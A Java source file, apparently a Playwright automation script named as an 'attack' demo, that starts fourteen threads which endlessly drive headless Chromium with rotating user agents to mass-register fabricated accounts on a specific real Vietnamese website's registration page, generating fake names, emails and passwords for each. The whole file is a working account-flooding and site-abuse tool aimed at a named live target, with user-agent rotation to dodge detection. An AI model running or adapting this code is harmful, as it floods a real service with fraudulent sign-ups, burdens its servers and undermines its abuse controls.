package demo.attackweb;

import com.microsoft.playwright.*;
import com.microsoft.playwright.options.LoadState;
import java.text.Normalizer;
import java.util.Random;

public class HelloApplication {

    private static final String[] USER_AGENTS = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:109.0) Gecko/20100101 Firefox/115.0"
    };

    public static void main(String[] args) throws Exception {
        new Thread(() -> attack()).start();
        new Thread(() -> attack()).start();
        new Thread(() -> attack()).start();
        new Thread(() -> attack()).start();
        new Thread(() -> attack()).start();
        new Thread(() -> attack()).start();
        new Thread(() -> attack()).start();
        new Thread(() -> attack()).start();
        new Thread(() -> attack()).start();
        new Thread(() -> attack()).start();
        new Thread(() -> attack()).start();
        new Thread(() -> attack()).start();
        new Thread(() -> attack()).start();
        new Thread(() -> attack()).start();
    }

    static void attack(){
        try (Playwright playwright = Playwright.create()) {
            while (true) {
                Browser browser = playwright.chromium()
                        .launch(new BrowserType.LaunchOptions().setHeadless(true));
                BrowserContext context = browser.newContext(new Browser.NewContextOptions()
                        .setUserAgent(randomUserAgent())
                );
                Page page = context.newPage();

                try {
                    page.navigate("https://tanmong.online/editor/register");

//                    System.out.println("Successfully accessed web");

                    page.waitForSelector("#name");
                    page.waitForSelector("#email");
                    page.waitForSelector("#username");
                    page.waitForSelector("#password");
                    page.waitForSelector("#password_confirmation");

                    String csrfToken = page.getAttribute("input[name='_token']", "value");
//                    System.out.println("CSRF Token: " + csrfToken);

                    UserData data = generateRandomUser();

                    page.fill("#name", data.name);
                    page.fill("#email", data.email);
                    page.fill("#username", data.username);
                    page.fill("#password", data.password);
                    page.fill("#password_confirmation", data.password);

                    page.click("button:has-text('Đăng ký')");

                    page.waitForLoadState(LoadState.NETWORKIDLE);

//                    System.out.println("[URL after submit]: " + page.url());

                    if (page.url().equals("https://tanmong.online/")) {
                        System.out.println("Registration successful: " + data.toString());
                    } else {
                        System.out.println("Registration may have failed or still pending.");
                    }

                    page.waitForTimeout(500); // chờ 2 giây trước lần tiếp theo

                    browser.close();
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    browser.close();
                }
            }
        }
    }

    private static String randomUserAgent() {
        Random rand = new Random();
        return USER_AGENTS[rand.nextInt(USER_AGENTS.length)];
    }

    public static UserData generateRandomUser() {
        Random rand = new Random();

        String lastName = LAST_NAMES[rand.nextInt(LAST_NAMES.length)];
        String middleName = MIDDLE_NAMES[rand.nextInt(MIDDLE_NAMES.length)];
        String givenName = GIVEN_NAMES[rand.nextInt(GIVEN_NAMES.length)];

        // Tạo tên đầy đủ
        String fullName = lastName + " " + middleName + " " + givenName;

        // Tạo ngày sinh random (1/1/1970 đến 31/12/2003)
        int day = rand.nextInt(28) + 1;       // 1-28 để đơn giản tránh lỗi ngày
        int month = rand.nextInt(12) + 1;     // 1-12
        int year = rand.nextInt(2003 - 1970 + 1) + 1970;  // 1970-2003

        String dobStr = String.format("%02d%02d%d", day, month, year);

        // Tạo username = tên đệm + tên (không dấu) + dob
        String rawUsername = middleName + givenName;
        String username = removeVietnameseAccent(rawUsername).toLowerCase() + dobStr;

        // Tạo email và password
        String email = username + "@gmail.com";
        String password = username + "#55";

        // Gán dữ liệu
        UserData formData = new UserData();
        formData.name = fullName;
        formData.username = username;
        formData.email = email;
        formData.password = password;

        return formData;
    }

    static String[] LAST_NAMES = {
            "Nguyễn", "Trần", "Lê", "Phạm", "Hoàng", "Huỳnh", "Phan", "Vũ", "Võ", "Đặng",
            "Bùi", "Đỗ", "Hồ", "Ngô", "Dương", "Lý", "Lưu", "Mai", "Trịnh", "Tô"
    };

    static String[] MIDDLE_NAMES = {
            "Văn", "Thị", "Hữu", "Thanh", "Minh", "Quang", "Ngọc", "Anh", "Tuấn", "Bảo"
    };

    static String[] GIVEN_NAMES = {
            "An", "Bình", "Cường", "Dũng", "Hà", "Hải", "Hạnh", "Hòa", "Hùng", "Huy",
            "Hương", "Khanh", "Khánh", "Lan", "Linh", "Mai", "Minh", "Nam", "Nga", "Ngọc"
    };


    public static class UserData {
        public String email, name, password, username;

        @Override
        public String toString() {
            return "FormData{" +
                    "email='" + email + '\'' +
                    ", name='" + name + '\'' +
                    ", password='" + password + '\'' +
                    ", username='" + username + '\'' +
                    '}';

        }
    }

    public static String removeVietnameseAccent(String str) {
        String temp = Normalizer.normalize(str, Normalizer.Form.NFD);
        // Loại bỏ dấu
        temp = temp.replaceAll("\\p{InCombiningDiacriticalMarks}+", "");
        // Thay đ, Đ bằng d, D
        temp = temp.replaceAll("đ", "d");
        temp = temp.replaceAll("Đ", "D");
        return temp;
    }

}